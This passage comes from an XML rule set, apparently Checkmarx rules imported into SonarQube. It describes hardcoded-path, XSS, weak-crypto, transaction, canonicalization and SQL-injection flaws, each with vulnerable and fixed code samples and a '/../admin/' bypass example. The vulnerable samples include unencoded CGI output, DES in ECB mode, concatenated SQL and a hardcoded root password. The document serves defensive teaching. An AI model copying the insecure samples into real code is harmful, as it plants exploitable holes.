&lt;p&gt;Moreover, on Windows by default all directories and files created outside of the system folders and outside the user's profile, will be allow full read and write access to any authenticated user. An unauthorized, malicious user could access any sensitive data in these folders, despite the application assuming they are protected. Even worse, an attacker&amp;nbsp;could overwrite existing programs in these unprotected folders and plant malicious code, which&amp;nbsp;will be activated by the application.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Do not hardcode absolute paths into the application.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Instead, store the absolute paths in an external configuration file, that can be modified as required for each environment.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Alternatively, use paths relative to the current application, if the target file is in a subdirectory of the application's root.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Do not assume a specific file system structure, outside of the application's subdirectories. On Windows, use the built-in expandable variables, such as &lt;code&gt;%WINDIR%&lt;/code&gt;, &lt;code&gt;%PROGRAMFILES%,&lt;/code&gt; and &lt;code&gt;%TEMP%&lt;/code&gt;.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;On Linux and other OS where available, implement a system jail (chroot) for the application, and store&amp;nbsp;all programs and data files there only.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Prefer storing all executables under the protected program directory (under "&lt;code&gt;C:\Program Files\&lt;/code&gt;" by default on Windows).&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Do not store sensitive data or configuration files in arbitrary folders. Likewise, do not store data files in the program directory. Instead, use the designated folders as intended, i.e. &lt;code&gt;%PROGRAMDATA%&lt;/code&gt; and &lt;code&gt;%APPDATA%&lt;/code&gt;&amp;nbsp;on Windows, respectively.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Configure hardened permissions to the most restricted as possible, according to the Principle of Least Privilege. Consider implementing this automatically in the installation and setup routines.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Hardcoded Path to Data File&lt;/h4&gt;&lt;pre&gt;public File getLogFile() { 
	String filename = "C:\Logs\myapp.log";
	File logFile = new File(filename); 

  	return logFile; 
}&lt;/pre&gt;&lt;h4&gt;Configured Path for Data File&lt;/h4&gt;&lt;pre&gt;public File getLogFile() { 
	Properties props = this.Properties; 
  	String filename = (String)props.get("logDirectory") + (String)props.get("logFilename");
  
	File logFile = new File(filename); 

  	return logFile; 
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_625</key><name>CGI_Reflected_XSS_All_Clients</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&lt;span id="docs-internal-guid-c71b5d0e-9d84-dd53-9c94-64e8de600bd5"&gt;&lt;span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"&gt;Special crafted HTTP requests might retrieve system information and exploit the system through CGI (Common Gateway Interface).&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p dir="ltr" style="line-height: 1.7142866666666667; margin-top: 0pt; margin-bottom: 0pt;"&gt;&lt;span style="font-family: Arial; color: #000000; background-color: #ffffff; font-weight: 400; font-style: normal; font-variant: normal; text-decoration: none; vertical-align: baseline; white-space: pre-wrap;"&gt;The CGI specification provides opportunities to read files, acquire shell access, and corrupt file systems on server machines and their attached hosts. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;
&lt;p dir="ltr" style="line-height: 1.7142866666666667; margin-top: 0pt; margin-bottom: 0pt;"&gt;&lt;span style="font-family: Arial; color: #000000; background-color: #ffffff; font-weight: 400; font-style: normal; font-variant: normal; text-decoration: none; vertical-align: baseline; white-space: pre-wrap;"&gt;Means of gaining access include: exploiting assumptions of the script, exploiting weaknesses in the server environment, and exploiting weaknesses in other programs and system calls. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;
&lt;p dir="ltr" style="line-height: 1.7142866666666667; margin-top: 0pt; margin-bottom: 0pt;"&gt;&amp;nbsp;&lt;/p&gt;
&lt;p dir="ltr" style="line-height: 1.7142866666666667; margin-top: 0pt; margin-bottom: 0pt;"&gt;&lt;span style="font-family: Arial; color: #000000; background-color: #ffffff; font-weight: 400; font-style: normal; font-variant: normal; text-decoration: none; vertical-align: baseline; white-space: pre-wrap;"&gt;The primary weakness in CGI scripts is insufficient input validation.&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p dir="ltr" style="line-height: 1.38; margin-top: 0pt; margin-bottom: 0pt;"&gt;&lt;span style="font-family: Arial; color: #000000; background-color: #ffffff; font-weight: 400; font-style: normal; font-variant: normal; text-decoration: none; vertical-align: baseline; white-space: pre-wrap;"&gt;Refrain from binding user input to system variables if not necessary.&lt;/span&gt;&lt;/p&gt;
&lt;p dir="ltr" style="line-height: 1.38; margin-top: 0pt; margin-bottom: 0pt;"&gt;&lt;span id="docs-internal-guid-c71b5d0e-9d95-efa3-1ca7-894d4af475fb"&gt;&lt;span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"&gt;Validate and encode all user input.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Perl&lt;/h3&gt;&lt;h4&gt;Bad - The script blindly prints out the submitted comment&lt;/h4&gt;&lt;pre&gt;#!/usr/bin/perl
use CGI;

my $cgi = CGI-&gt;new();
my $text = $cgi-&gt;param('comment');

print $cgi-&gt;header();
print "You entered $text";&lt;/pre&gt;&lt;h4&gt;Good - The comment is being encoded before printed out&lt;/h4&gt;&lt;pre&gt;#!/usr/bin/perl
use CGI;
use HTML::Entities;

my $cgi = CGI-&gt;new();
my $text = $cgi-&gt;param('comment');

print $cgi-&gt;header();
print "You entered ", HTML::Entities::encode($text);&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_581</key><name>Heuristic_CGI_Stored_XSS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&lt;span style="color: rgba(0, 0, 0, 0.870588); font-family: Arial; line-height: 25.7143px; white-space: pre-wrap;"&gt;Stored malicious data might retrieve system information and exploit the system through CGI (Common Gateway Interface).&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.71429;"&gt;&lt;span style="box-sizing: border-box; font-family: Arial; color: #000000; vertical-align: baseline; white-space: pre-wrap;"&gt;The CGI specification provides opportunities to read files, acquire shell access, and corrupt file systems on server machines and their attached hosts. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;
&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.71429;"&gt;&lt;span style="box-sizing: border-box; font-family: Arial; color: #000000; vertical-align: baseline; white-space: pre-wrap;"&gt;Means of gaining access include: exploiting assumptions of the script, exploiting weaknesses in the server environment, and exploiting weaknesses in other programs and system calls. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;
&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.71429;"&gt;&amp;nbsp;&lt;/p&gt;
&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.71429;"&gt;&lt;span style="box-sizing: border-box; font-family: Arial; color: #000000; vertical-align: baseline; white-space: pre-wrap;"&gt;The primary weakness in CGI scripts is insufficient input validation.&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.38;"&gt;&lt;span style="box-sizing: border-box; font-family: Arial; color: #000000; vertical-align: baseline; white-space: pre-wrap;"&gt;Do not provide unnecessary file permissions.&lt;/span&gt;&lt;/p&gt;
&lt;p dir="ltr" style="box-sizing: border-box; margin: 0pt 0px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.38;"&gt;&lt;span id="docs-internal-guid-c71b5d0e-9d95-efa3-1ca7-894d4af475fb" style="box-sizing: border-box;"&gt;&lt;span style="box-sizing: border-box; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"&gt;Validate and encode all DB output.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Perl&lt;/h3&gt;&lt;h4&gt;Bad - Printing out data from BD without encoding&lt;/h4&gt;&lt;pre&gt;#!/usr/bin/perl
use CGI;
use DBI;

my $cgi = CGI-&gt;new();

$dbh = DBI-&gt;connect('dbi:mysql:perltest','root','password')
  or die "Connection Error: $DBI::errstr\n";
$sql = "select * from samples";
$sth = $dbh-&gt;prepare($sql);
$sth-&gt;execute
  or die "SQL Error: $DBI::errstr\n";

my @row = $sth-&gt;fetchrow_array;

print $cgi-&gt;header();
	$cgi-&gt;start_html(),
	$cgi-&gt;p("The result from DB is: ", @row),
	$cgi-&gt;end_html;&lt;/pre&gt;&lt;h4&gt;Good - Printing out from DB after encoding&lt;/h4&gt;&lt;pre&gt;#!/usr/bin/perl
use CGI;
use DBI;
use HTML::Entities;

my $cgi = CGI-&gt;new();

$dbh = DBI-&gt;connect('dbi:mysql:perltest','root','password')
  or die "Connection Error: $DBI::errstr\n";
$sql = "select * from samples";
$sth = $dbh-&gt;prepare($sql);
$sth-&gt;execute
  or die "SQL Error: $DBI::errstr\n";

my @row = $sth-&gt;fetchrow_array;

print $cgi-&gt;header();
	$cgi-&gt;start_html(),
	$cgi-&gt;p("The result from DB is: ", HTML::Entities::encode(@row)),
	$cgi-&gt;end_html;&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1068</key><name>Escape_False</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Since the application is not using context-specific encoding, it may be possible for an attacker to find a&amp;nbsp;Cross-Site Scripting (XSS) vulnerability, enabling them to&amp;nbsp;steal the user's password, request the user&amp;rsquo;s credit card information, provide false information, or run malicious code. All this would still be in context of the original web application, from the victim's perspective, allowing the attacker to effectively control the user's experience on the target website.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The application dynamically creates JavaScript scripts in the website's pages, embedding&amp;nbsp;data generated on the server directly into the client JavaScript.&amp;nbsp;This data might be controllable from user input. In order to protect this page against Cross-Site Scripting (XSS) attacks, the application does ensure the data is encoded before being output into the response.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;However, the application does not perform proper context-specific&amp;nbsp;encoding, in particular encoding the input for HTML instead of JavaScript-specific encoding. This could allow an attacker to inject a JavaScript payload into the response, despite the encoding. This JavaScript would be executed by the victim's browser.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Generic Guidance&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Avoid generating JavaScript code dynamically, based on user input or other data.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Fully encode all dynamic data before embedding it in output.&lt;/li&gt;
&lt;li&gt;Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML Attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;JavaScript encoding for server-generated JavaScript&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using the &lt;code&gt;System.Web.Security.AntiXss.AntiXssEncoder&lt;/code&gt;&amp;nbsp;class (or the AntiXss library in older versions), to provide context-specific encoding methods.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;li&gt;Implement Content Security Policy (CSP) headers, to constrain and restrict the source of JavaScript code.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Specific Recommendations&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Remove the dynamically generated JavaScript code, and seperate any source of data from the source code.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;If it is necessary to dynamically generate JavaScript from data, use context-specific encoding on all data to properly mitigate XSS and simliar attacks.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Consider using Razor's built-in context encoding nuggets.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Generating JavaScript from Server Code&lt;/h4&gt;&lt;pre&gt;&lt;%@ Page Language="C#" AutoEventWireup="true" CodeBehind="javascriptGenerator.aspx.cs" 
  			Inherits="javascriptGenerator" %&gt;
&lt;script&gt; 
	var dataFromServer = "&lt;%= Server.HtmlEncode(this.JsCode); %&gt;";
	
    doSomething(dataFromServer);
&lt;/script&gt;&lt;/pre&gt;&lt;h4&gt;Using Modern Razor Auto Encoding&lt;/h4&gt;&lt;pre&gt;@{
	LayoutPage = "SiteLayout.cshtml";
}

&lt;script&gt; 
	var dataFromServer = "@this.JsCode"
	
    doSomething(dataFromServer);
&lt;/script&gt;&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_623</key><name>Use_of_Broken_or_Risky_Cryptographic_Algorithm</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Using a weak or broken algorithm ruins the protection granted by using cryptographic mechanisms in the first place, harming the confidentiality or integrity of sensitive user data. This could allow an attacker to steal secret information, alter sensitive data, or forge the source of modified messages.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The application code specifies the name of the selected cryptographic algorithm, either via a String argument, a factory method, or a specific implementation class. These algorithms have fatal cryptographic weaknesses, that make it trivial to break in a reasonable timeframe. Strong algorithms should withstand attacks far beyond the realm of possible.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Only use strong, approved cryptographic algorithms, including AES, RSA, ECC, and SHA-256 respectively, amongst others.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Do not use weak algorithms that are considered completely broken, such as DES, RC4, and MD5, amongst others.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Avoid, where possible, using legacy algorithms that are not considered "future-proof" with sufficient safety margins, even though they are considered "safe enough" for today. This includes algorithms that are weaker than they should be, and have stronger replacements, even if they are not yet fatally broken - such as SHA-1, 3DES,&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Consider using a relevant official set of classifications, such as NIST or ENISA. If possible, use only FIPS 140-2 certified algorithm implementations.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Legacy Encryption with DES&lt;/h4&gt;&lt;pre&gt;private static byte[] encrypt(String plainText) {
	byte[] encData;
  
    SecretKey key = new SecretKeySpec(SECRET_KEY, "DES");

  	Cipher cipher = Cipher.getInstance("DES/ECB/NoPadding");
  	cipher.init(Cipher.ENCRYPT_MODE, key);

  	encData = cipher.doFinal(plainText.getBytes());
  	byte[] iv = cipher.getIV();
      
	return encData;
}&lt;/pre&gt;&lt;h4&gt;Modern Encryption with AES&lt;/h4&gt;&lt;pre&gt;private static byte[] encrypt(String plainText) {
	byte[] encData;
  
	try {
        SecretKey key = new SecretKeySpec(SECRET_KEY_FROM_CONFIG, "AES");

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
			// Consider a stronger mode, such as GCM / CCM / or other AEAD mode, if required
        cipher.init(Cipher.ENCRYPT_MODE, key);

 		encData = cipher.doFinal(plainText.getBytes("UTF-8"));
        byte[] iv = cipher.getIV();

    } catch (GeneralSecurityException e) {
        handleError(e);
    }
	return encData;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_607</key><name>Improper_Transaction_Handling</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Database transactions that are abandoned (if their associated connection is closed, before the transaction is committed or rolled back) can have several different results, depending on implementation and specific technologies in use. While in some scenarios the database will automatically roll back the transaction if the connection is closed, more often it will either automatically commit the transaction in its abortive state, or leave the transaction open indefinitely (depending on its configured timeout value).&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;In the first case, a transaction that is committed after a runtime exception is likely to be in an inconsistent state, incompatible with the current runtime conditions. This would result in situation detrimental to the system's integrity and possibly even stability.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;In the second case, a transaction that is kept active&amp;nbsp;indefinitely would cause the database server to retain its locks on all records and tables affected by the transaction. This could cause general reliability and availability problems, leading to delays, degraded performance, or even deadlocks as one thread waits for the locks to be released.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;In either case this results in unexpected state, and is dependent on external factors such that the application is not controlling the result.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The application creates a connection to the database, and explicitly manages the database transaction by committing it when appropriate. However, the code does not explicitly roll back failed transactions, for example in the case of exceptions. This causes the application to rely on implementation-specific behavior, depending on the specific combination of technologies (such as the database server) and resultant configuration.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Always open database connections and begin transactions within a &lt;code&gt;try { }&lt;/code&gt; block.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ensure there are no active uncommitted transactions before closing a database connection.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Always rollback active transactions in the case of exceptions.&lt;/li&gt;
&lt;li&gt;After handling the exception, ensure the transaction is rolled back in the &lt;code&gt;catch { }&lt;/code&gt; block, or possibly in the &lt;code&gt;finally { }&lt;/code&gt; block. &amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Implicit Failed Transaction Handling&lt;/h4&gt;&lt;pre&gt;public void updateValues(int id, String value) {
	Connection con; 
	PreparedStatement orderStmt = null;
	PreparedStatement custStmt = null; 
 
    try {
		con = DriverManager.getConnection(CONN_STRING);
        con.setAutoCommit(false);

      	String orderSql = "update ORDERS set DESCRIPTION = ? where CUSTID = ?";
        orderStmt = con.prepareStatement(orderSql);
      	orderStmt.setString(1, value);
      	orderStmt.setInt(2, id); 
      	orderStmt.executeUpdate(); 
      
      	String custSql = "update CUSTOMERS set TOTAL = TOTAL + 1 where ID = ?"
        custStmt = con.prepareStatement(custSql);
      	custStmt.setInt(1, id); 
      	custStmt.executeUpdate();
      
      	con.commit();
    } catch (SQLException e ) {
        handleException(e);
    } finally {
        if (orderStmt != null)
            orderStmt.close();
        if (custStmt != null)
            custStmt.close();
        if (con != null)
			con.close();  // In case of exception, transaction might be rolled back, might not... 
    }
}&lt;/pre&gt;&lt;h4&gt;Explicit Rollback of Failed Transaction&lt;/h4&gt;&lt;pre&gt;public void updateValues(int id, String value) {
	Connection con; 
	PreparedStatement orderStmt = null;
	PreparedStatement custStmt = null; 
 
    try {
		con = DriverManager.getConnection(CONN_STRING);
        con.setAutoCommit(false);

      	String orderSql = "update ORDERS set DESCRIPTION = ? where CUSTID = ?";
        orderStmt = con.prepareStatement(orderSql);
      	orderStmt.setString(1, value);
      	orderStmt.setInt(2, id); 
      	orderStmt.executeUpdate(); 
      
      	String custSql = "update CUSTOMERS set TOTAL = TOTAL + 1 where ID = ?"
        custStmt = con.prepareStatement(custSql);
      	custStmt.setInt(1, id); 
      	custStmt.executeUpdate();
      
      	con.commit();
    } catch (SQLException e ) {
        handleException(e);
		if (con != null) {
			try {
              	// Explicitly rollback active transaction in case of exception
				con.rollback(); 
            } catch (SQLException innerEx) {
				handleException(innerEx); 
            }
		}
    } finally {
        if (orderStmt != null)
            orderStmt.close();
        if (custStmt != null)
            custStmt.close();
        if (con != null)
			con.close();
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_602</key><name>Cleansing_Canonicalization_and_Comparison_Errors</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;If a security decision, such as access control for example, is taken based on unsanitized, user-controlled data, it may be possible for&amp;nbsp;an attacker to manipulate the format of the data,&amp;nbsp;and thus obfuscate the actual&amp;nbsp;target. For example, if users are allowed to read any page that has&amp;nbsp;their user id in the URL, a user can request a URL with multiple user ids. Another example could be an administrative interface, wherein users are forbidden from accessing any page under the &lt;code&gt;/admin/&lt;/code&gt; folder; an attacker can hide the actual target by sending a request to &lt;code&gt;/NOTEXISTS/../admin/&lt;/code&gt;&amp;nbsp;. This would evade the check for URLs starting with "admin/", if the request URL is not canonicalized before checking.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Filesystem paths and Internet URLs can be represented in an unlimited number of different ways, using various encodings, folder misdirection, and path obfuscation techniques. If a path or address is not properly sanitized and fully canonicalized into it's most basic, simplified form, it would be impossible to check all possible variants of this path. Hence, any decision based on a specific attributes of the path would likely be mistaken, and can be evaded by an active attacker.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Avoid performing security decisions based on untrusted, user-controlled input.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Always sanitize all user input.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Before making any decision based on a URL or path parameter, always transform it first into its canonical form, before making any decisions or doing any checks on it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Block Access to Admin Directory&lt;/h4&gt;&lt;pre&gt;private void blockAdminAccess(HttpServletRequest request, HttpServletResponse response) {
	String path = request.getRequestURI();
  
  	if (path.startsWith("/admin")) {
      	response.setError(response.SC_FORBIDDEN);	// return HTTP Status 403: Forbidden
    }
}&lt;/pre&gt;&lt;h4&gt;Ensure Path is Canonicalized Before Blocking Admin Access&lt;/h4&gt;&lt;pre&gt;private void blockAdminAccess(HttpServletRequest request, HttpServletResponse response) {
	String path = ESAPI.encoder().canonicalize(request.getRequestURI());
  
  	if (path.contains("/admin")) {
      	response.setError(response.SC_FORBIDDEN);	// return HTTP Status 403: Forbidden
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3885</key><name>XQuery_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could directly access all of the system's data. Using simple tools and text editing, the attacker would be able to steal any sensitive information stored by the system (such as personal user details or credit cards), and possibly change or erase existing data.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application communicates with its database by sending a textual SQL query. The application creates the query by simply concatenating strings including the user's input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could contain SQL commands that would be interpreted as such by the database.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Instead of concatenating strings: a. Use secure database components such as stored procedures, parameterized queries, and object bindings (for commands and parameters). b. An even better solution is to use an ORM library, such as EntityFramework, Hibernate, or iBatis.&lt;/li&gt;
&lt;li&gt;Restrict access to database objects and functionality, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application creates an SQL query using string obtained from the user
      &lt;/h4&gt;&lt;pre&gt;public class SQLInjection
{
        public void foo(TextBox tbUserName, SqliteConnection connection)
        {	
                string user = tbUserName.Text;
                string sql = "insert into users(name) VALUES (user)"
                MySqlCommand cmd = new MySqlCommand(sql, connection);
                connection.Open();
                SqlDataReader reader = cmd.ExecuteReader();
        }
}&lt;/pre&gt;&lt;h4&gt;
The string obtained from the user is checked for potentially malicious characters
      &lt;/h4&gt;&lt;pre&gt;
class SqlInjectionFixed
{
        public void foo(TextBox tbUserName, SqliteConnection connection)
        {
                string user = tbUserName.Text;
                string sql = "insert into users(name) VALUES (@param1)";
                MySqlCommand cmd = new MySqlCommand(sql, connection);
                cmd.Parameters.AddWithValue(@param1, user);
                connection.Open();
                SqlDataReader reader = cmd.ExecuteReader();
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application creates an SQL query using string obtained from the user&lt;/h4&gt;&lt;pre&gt;public class SQL_Injection {
	public static void getUserId(Connection con) {
		System.out.println("enter user name");
		Scanner in = new Scanner(System.in);
		String user = in.nextLine();
		String query = "select user_id from User where user = " + user;
		Statement stmt = con.createStatement();
